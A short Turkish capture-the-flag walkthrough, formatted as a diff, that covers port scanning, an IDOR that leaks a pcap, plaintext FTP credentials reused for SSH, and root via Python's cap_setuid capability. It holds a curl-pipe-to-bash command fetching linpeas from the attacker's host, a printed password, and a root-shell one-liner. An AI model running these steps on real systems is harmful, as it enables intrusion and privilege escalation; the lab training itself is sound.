@@ -1,0 +1,43 @@
+Karşımızda kolay bir ctf var. ne olursa olsun her zaman keşif ile başlarız.
+
+nmap -sV -p- -v -T5 ip
+
+21 (FTP): Anonymous girişe kapalı.
+
+22 (SSH): OpenSSH servisi çalışıyor.
+
+80 (HTTP): Python tabanlı Gunicorn sunucusu üzerinde çalışan bir web arayüzü var.
+
+
+şimdi ise webte idor testi yapalım 
+
+http://İP/data/1
+
+bu adreste id 1 dikkatimi çekti 0 yaptım önüme başka data geldi indirdim pcap dosyasyı çıktı.
+
+Şifrelenmemiş (cleartext) protokolleri aradığım için Wireshark filtre çubuğuna direkt ftp yazdım.
+
+FTP protokolünde kullanıcı adları USER, parolalar ise PASS komutuyla açık metin olarak gönderilir.
+
+Paketleri incelediğimde düz metin olarak iletilen şu kimlik bilgilerini yakaladım:
+
+Kullanıcı: nathan
+
+Parola: Buck3tH4TF0RM3!
+
+bu bilgiler ile ssh bağlantısı aldım.
+
+ssh nathan@10.10.10.245  
+
+daha sonra user flagı alın. şimdi ise root flag isityor yetki yükseltmek için sistemi analiz edelim.
+
+curl http://<KENDI-IP-ADRESIN>/linpeas.sh | bash
+
+Rapor sonuçlarında dosya yetkileri (capabilities) bölümünde garip bir detay göze çarptı:
+
+/usr/bin/python3.8 dosyasında cap_setuid ve cap_net_bind_service yetkileri tanımlanmıştı. Normalde root olmayan bir kullanıcının ağ trafiği yakalayabilmesi için Python'a bu yetki verilmiş gibi duruyordu.
+
+cap_setuid yetkisi, Python üzerinden UID değerini 0 (root) yapmamıza olanak tanır. Bunu sömürerek tek satırda root kabuğunu aldım:
+
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
